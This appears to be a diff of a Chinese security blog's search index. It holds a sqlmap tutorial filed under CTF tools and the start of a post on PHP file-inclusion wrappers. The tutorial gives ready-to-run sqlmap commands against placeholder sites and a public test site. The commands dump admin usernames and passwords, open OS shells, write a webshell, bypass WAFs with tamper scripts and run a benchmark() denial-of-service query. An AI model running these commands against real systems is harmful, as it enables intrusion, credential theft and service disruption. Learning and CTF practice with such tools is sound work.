-<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
-<ul>
-<li>-reg-read 读一个Windows注册表项值</li>
-<li>-reg-add 写一个Windows注册表项值数据</li>
-<li>-reg-del 删除Windows注册表键值</li>
-<li>-reg-key&#x3D;REGKEY Windows注册表键</li>
-<li>-reg-value&#x3D;REGVAL Windows注册表项值</li>
-<li>-reg-data&#x3D;REGDATA Windows注册表键值数据</li>
-<li>-reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
-<li>这些选项可以用来设置一些一般的工作参数。</li>
-<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
-<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
-<li>-flush-session 刷新当前目标的会话文件</li>
-<li>-fresh-queries 忽略在会话文件中存储的查询结果</li>
-<li>-eta 显示每个输出的预计到达时间</li>
-<li>-update 更新SqlMap</li>
-<li>-save file保存选项到INI配置文件</li>
-<li>-batch 从不询问用户输入，使用所有默认配置。</li>
-</ul>
-<p>Miscellaneous（杂项）：</p>
-<ul>
-<li>-beep 发现SQL注入时提醒</li>
-<li>-check-payload IDS对注入payloads的检测测试</li>
-<li>-cleanup SqlMap具体的UDF和表清理DBMS</li>
-<li>-forms 对目标URL的解析和测试形式</li>
-<li>-gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
-<li>-page-rank Google dork结果显示网页排名（PR）</li>
-<li>-parse-errors 从响应页面解析数据库管理系统的错误消息</li>
-<li>-replicate 复制转储的数据到一个sqlite3数据库</li>
-<li>-tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
-<li>-wizard 给初级用户的简单向导界面</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Tools</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1754,6 +1290,344 @@
       </tags>
   </entry>
   <entry>
+    <title>SQLmap使用</title>
+    <url>/2023/10/29/SQLmap%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h2><p>(1) 猜解是否能注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; </span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 猜解表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin </span></span><br><span class="line">Linux: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; <span class="comment">--columns -T admin</span></span><br></pre></td></tr></table></figure>
+
+<p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T admin -C <span class="string">&quot;username,password&quot;</span> </span><br><span class="line"> Linux: python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot;</span> <span class="attr">--dump</span> -T </span><br><span class="line"> admin -C <span class="string">&quot;username,[url=]B[/url]password&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h2><p>(1) cookie注入，猜解表</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows:  python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --table --level 2</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --columns -T </span></span><br><span class="line">admin <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 猜解内容</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.org/jsj/shownews.asp&quot; <span class="comment">--cookie &quot;id=31&quot; --dump -T </span></span><br><span class="line">admin <span class="operator">-</span>C  &quot;username,password&quot; <span class="comment">--level 2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#三、SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">windows: python sqlmap.py <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql</span></span><br><span class="line"><span class="operator">-</span>shell </span><br><span class="line">Linux: sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--sql-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 输入执行语句完成DDOS攻击</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark (<span class="number">99999999999</span>,<span class="number">0x70726f62616e646f70726f62616e646f70726f62616e646f</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 通过2中的表得出列名(假如表为table_name)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+
+<p>(4) 获取字段的值(假如扫描出id,user,password字段)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://www.xxx.com/link.php?id=321&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T table_name <span class="operator">-</span>C &quot;id,user,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h2><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p>
+<blockquote>
+<p>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</p>
+</blockquote>
+<ol>
+<li><p>浏览器打开目标地址http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;Login.asp</p>
+</li>
+<li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p>
+</li>
+<li><p>点击login表单的submit按钮</p>
+</li>
+<li><p>这时候Burp会拦截到了我们的登录POST请求</p>
+</li>
+<li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
+</li>
+<li><p>运行sqlmap并使用如下命令：</p>
+</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="operator">/</span>sqlmap.py  <span class="operator">-</span> r <span class="keyword">search</span> <span class="operator">-</span> test.txt  <span class="operator">-</span> p tfUPass</span><br></pre></td></tr></table></figure>
+
+<p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。</p>
+<p>注入点：<a href="http://testasp.vulnweb.com/Login.asp">http://testasp.vulnweb.com/Login.asp</a></p>
+<p>几种注入方式：.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</p>
+<p>(2) 自动的搜索</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url]<span class="link">http://testasp.vulnweb.com/Login.asp</span>[<span class="string">/url</span>] --forms</span><br></pre></td></tr></table></figure>
+
+<p>(3) 指定参数搜索</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span>testasp.vulnweb.com<span class="operator">/</span>Login.asp[<span class="operator">/</span>url] <span class="comment">--data &quot;tfUName=321&amp;tfUPass=321&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h2><p>inurl后面的语言是由自己定的</p>
+<p>注入过程中如果选y是注入，如果不是选n</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>g inurl:php?id<span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h2><p>参数 –delay –safe-freq</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="comment">--dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --delay 1 python sqlmap.py --dbs -u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; --safe-freq 3</span></span><br></pre></td></tr></table></figure>
+
+<p>参数</p>
+<h2 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h2><p>注入点:<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="operator">-</span>v <span class="number">3</span> <span class="comment">--dbs --batch --tamper &quot;space2morehash.py&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
+<p>都是编码方式</p>
+<p>space2hash.py base64encode.py charencode.py</p>
+<h2 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.1</span> <span class="number">68.1</span> <span class="number">59.1</span><span class="operator">/</span>news.php? id<span class="operator">=</span><span class="number">1</span> [<span class="operator">/</span>url] <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+
+<p>(4) 通过3得到字段值(假如从3中得到字段id，password)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://xxx.cn/index.php/Index/view/id/40.html&quot; <span class="operator">-</span>D dataname <span class="operator">-</span>T tablename <span class="operator">-</span>C &quot;password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h2><p>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1">http://192.168.159.1/news.php?id=1</a></p>
+<p>此处采用的是Linux系统</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-cmd=ipconfig</span></span><br></pre></td></tr></table></figure>
+
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:&#x2F;www&#x2F;</p>
+<p>(2) 获取Shell</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url]http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.159</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span>[<span class="operator">/</span>url] <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>出现语言的选择根据实际的测试网站选择语言</p>
+<p>指定目标站点D:&#x2F;www&#x2F;</p>
+<p>输入ipconfig&#x2F;all</p>
+<p>创建用户和删除用户</p>
+<p>只要权限足够大，你可以输入使用任何命令。</p>
+<p>其他命令参考下面：</p>
+<p>从数据库中搜索字段</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c:\tools\request.txt&quot; <span class="operator">-</span>dbms mysql <span class="operator">-</span>D dedecms <span class="operator">-</span><span class="keyword">search</span> <span class="operator">-</span>C admin,password</span><br></pre></td></tr></table></figure>
+
+<p>在dedecms数据库中搜索字段admin或者password。</p>
+<p>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
+<p>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
+<p>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p>#示例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c: \request.txt&quot;  <span class="operator">-</span>p id <span class="operator">-</span>dbms mysql <span class="operator">-</span>file<span class="operator">-</span>dest &quot;e:\php\htdocs\dvwa\inc\include\1. php&quot; <span class="operator">-</span>file <span class="operator">-</span>write &quot;f:\webshell\1112.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用shell命令：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r &quot;c : \tools\request.txt&quot; <span class="operator">-</span>p id <span class="operator">-</span>dms mysql <span class="operator">-</span>os<span class="operator">-</span>shell</span><br></pre></td></tr></table></figure>
+
+<p>接下来指定网站可写目录：</p>
+<p>“E:\php\htdocs\dvwa”</p>
+<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<p>sqlmap详细命令：</p>
+<ul>
+<li>-is-dba 当前用户权限（是否为root权限）</li>
+<li>-dbs 所有数据库</li>
+<li>-current-db 网站当前数据库</li>
+<li>-users 所有数据库用户</li>
+<li>-current-user 当前数据库用户</li>
+<li>-random-agent 构造随机user-agent</li>
+<li>-passwords 数据库密码</li>
+<li>-proxy <a href="http://local:8080/">http://local:8080</a> -threads 10 (可以自定义线程加速) 代理</li>
+<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+</ul>
+<p>Options（选项）：</p>
+<ul>
+<li>-version 显示程序的版本号并退出</li>
+<li>-h, -help 显示此帮助消息并退出</li>
+<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
+</ul>
+<p>Target（目标）：</p>
+<p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<ul>
+<li>-d DIRECT 直接连接到数据库。</li>
+<li>-u URL, -url&#x3D;URL 目标URL。</li>
+<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
+<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
+<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
+<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
+</ul>
+<p>Request（请求）：</p>
+<p>这些选项可以用来指定如何连接到目标URL。</p>
+<ul>
+<li>-data&#x3D;DATA 通过POST发送的数据字符串</li>
+<li>-cookie&#x3D;COOKIE HTTP Cookie头</li>
+<li>-cookie-urlencode URL 编码生成的cookie注入</li>
+<li>-drop-set-cookie 忽略响应的Set - Cookie头信息</li>
+<li>-user-agent&#x3D;AGENT 指定 HTTP User - Agent头</li>
+<li>-random-agent 使用随机选定的HTTP User - Agent头</li>
+<li>-referer&#x3D;REFERER 指定 HTTP Referer头</li>
+<li>-headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
+<li>-auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
+<li>-auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</li>
+<li>-auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</li>
+<li>-proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</li>
+<li>-proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</li>
+<li>-ignore-proxy 忽略系统默认的HTTP代理</li>
+<li>-delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
+<li>-timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</li>
+<li>-retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</li>
+<li>-scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
+<li>-safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</li>
+<li>-safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</li>
+</ul>
+<p>Enumeration（枚举）：</p>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
+<ul>
+<li>-b, -banner 检索数据库管理系统的标识</li>
+<li>-current-user 检索数据库管理系统当前用户</li>
+<li>-current-db 检索数据库管理系统当前数据库</li>
+<li>-is-dba 检测DBMS当前用户是否DBA</li>
+<li>-users 枚举数据库管理系统用户</li>
+<li>-passwords 枚举数据库管理系统用户密码哈希</li>
+<li>-privileges 枚举数据库管理系统用户的权限</li>
+<li>-roles 枚举数据库管理系统用户的角色</li>
+<li>-dbs 枚举数据库管理系统数据库</li>
+<li>-D DBname 要进行枚举的指定数据库名</li>
+<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename -columns）</li>
+<li>-tables 枚举的DBMS数据库中的表</li>
+<li>-columns 枚举DBMS数据库表列</li>
+<li>-dump 转储数据库管理系统的数据库中的表项</li>
+<li>-dump-all 转储所有的DBMS数据库表中的条目</li>
+<li>-search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</li>
+<li>-C COL 要进行枚举的数据库列</li>
+<li>-U USER 用来进行枚举的数据库用户</li>
+<li>-exclude-sysdbs 枚举表时排除系统数据库</li>
+<li>-start&#x3D;LIMITSTART 第一个查询输出进入检索</li>
+<li>-stop&#x3D;LIMITSTOP 最后查询的输出进入检索</li>
+<li>-first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</li>
+<li>-last&#x3D;LASTCHAR 最后查询的输出字字符检索</li>
+<li>-sql-query&#x3D;QUERY 要执行的SQL语句</li>
+<li>-sql-shell 提示交互式SQL的shell</li>
+</ul>
+<p>Optimization（优化）：</p>
+<p>这些选项可用于优化SqlMap的性能。</p>
+<ul>
+<li>-o 开启所有优化开关</li>
+<li>-predict-output 预测常见的查询输出</li>
+<li>-keep-alive 使用持久的HTTP（S）连接</li>
+<li>-null-connection 从没有实际的HTTP响应体中检索页面长度</li>
+<li>-threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
+</ul>
+<p>Injection（注入）：</p>
+<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<ul>
+<li>-p TESTPARAMETER 可测试的参数（S）</li>
+<li>-dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
+<li>-os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
+<li>-prefix&#x3D;PREFIX 注入payload字符串前缀</li>
+<li>-suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
+<li>-tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
+</ul>
+<p>Detection（检测）：</p>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<ul>
+<li>-level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
+<li>-risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
+<li>-string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
+<li>-regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
+<li>-text-only 仅基于在文本内容比较网页</li>
+</ul>
+<p>Techniques（技巧）：</p>
+<p>这些选项可用于调整具体的SQL注入测试。</p>
+<ul>
+<li>-technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
+<li>-time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
+<li>-union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
+<li>-union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
+</ul>
+<p>Fingerprint（指纹）：</p>
+<ul>
+<li>-f, -fingerprint 执行检查广泛的DBMS版本指纹</li>
+</ul>
+<p>Brute force（蛮力）：</p>
+<p>这些选项可以被用来运行蛮力检查。</p>
+<ul>
+<li>-common-tables 检查存在共同表</li>
+<li>-common-columns 检查存在共同列</li>
+</ul>
+<p>User-defined function injection（用户自定义函数注入）：</p>
+<p>这些选项可以用来创建用户自定义函数。</p>
+<p>-udf-inject 注入用户自定义函数</p>
+<p>-shared-lib&#x3D;SHLIB 共享库的本地路径</p>
+<p>File system access（访问文件系统）：</p>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<ul>
+<li>-file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件</li>
+<li>-file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件</li>
+<li>-file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径</li>
+</ul>
+<p>Operating system access（操作系统访问）：</p>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<ul>
+<li>-os-cmd&#x3D;OSCMD 执行操作系统命令</li>
+<li>-os-shell 交互式的操作系统的shell</li>
+<li>-os-pwn 获取一个OOB shell，meterpreter或VNC</li>
+<li>-os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</li>
+<li>-os-bof 存储过程缓冲区溢出利用</li>
+<li>-priv-esc 数据库进程用户权限提升</li>
+<li>-msf-path&#x3D;MSFPATH Metasploit Framework本地的安装路径</li>
+<li>-tmp-path&#x3D;TMPPATH 远程临时文件目录的绝对路径</li>
+</ul>
+<p>Windows注册表访问：</p>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<ul>
+<li>-reg-read 读一个Windows注册表项值</li>
+<li>-reg-add 写一个Windows注册表项值数据</li>
+<li>-reg-del 删除Windows注册表键值</li>
+<li>-reg-key&#x3D;REGKEY Windows注册表键</li>
+<li>-reg-value&#x3D;REGVAL Windows注册表项值</li>
+<li>-reg-data&#x3D;REGDATA Windows注册表键值数据</li>
+<li>-reg-type&#x3D;REGTYPE Windows注册表项值类型</li>
+<li>这些选项可以用来设置一些一般的工作参数。</li>
+<li>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</li>
+<li>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</li>
+<li>-flush-session 刷新当前目标的会话文件</li>
+<li>-fresh-queries 忽略在会话文件中存储的查询结果</li>
+<li>-eta 显示每个输出的预计到达时间</li>
+<li>-update 更新SqlMap</li>
+<li>-save file保存选项到INI配置文件</li>
+<li>-batch 从不询问用户输入，使用所有默认配置。</li>
+</ul>
+<p>Miscellaneous（杂项）：</p>
+<ul>
+<li>-beep 发现SQL注入时提醒</li>
+<li>-check-payload IDS对注入payloads的检测测试</li>
+<li>-cleanup SqlMap具体的UDF和表清理DBMS</li>
+<li>-forms 对目标URL的解析和测试形式</li>
+<li>-gpage&#x3D;GOOGLEPAGE 从指定的页码使用谷歌dork结果</li>
+<li>-page-rank Google dork结果显示网页排名（PR）</li>
+<li>-parse-errors 从响应页面解析数据库管理系统的错误消息</li>
+<li>-replicate 复制转储的数据到一个sqlite3数据库</li>
+<li>-tor 使用默认的Tor（Vidalia&#x2F; Privoxy&#x2F; Polipo）代理地址</li>
+<li>-wizard 给初级用户的简单向导界面</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Tools</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
     <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
     <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
@@ -1787,6 +1661,132 @@
       <tags>
         <tag>vulhub</tag>
         <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP伪协议</title>
+    <url>/2023/10/31/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p>
+<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>代码执行到 include() 函数时将文件包含</td>
